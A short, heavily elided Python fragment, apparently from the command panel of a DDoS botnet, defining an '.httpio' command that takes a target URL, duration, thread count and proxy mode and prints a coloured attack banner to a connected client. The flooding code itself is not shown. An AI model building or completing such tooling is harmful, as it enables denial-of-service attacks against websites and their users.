...
def httpio(args, validate_time, send, client, ansi_clear, broadcast, data):
    ...
    if len(args) == 5:
        ...
        xxxx = '''%s============= (%sTARGET%s) ==============
            ...
            %sTYPE:%s %s
         %sTHREADS:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTWHITE_EX, Fore.GREEN, Fore.LIGHTWHITE_EX, Fore.CYAN, Fore.YELLOW, url, Fore.CYAN, Fore.YELLOW, secs, Fore.CYAN, Fore.YELLOW, attackType, Fore.CYAN, Fore.YELLOW, threadx, Fore.CYAN, Fore.YELLOW, 'HTTP IO')
        ...
        send(client, f'\nUsage: {Fore.YELLOW}.httpio [URL] [TIME] [THREADS] [PROXY, NORMAL]\n')
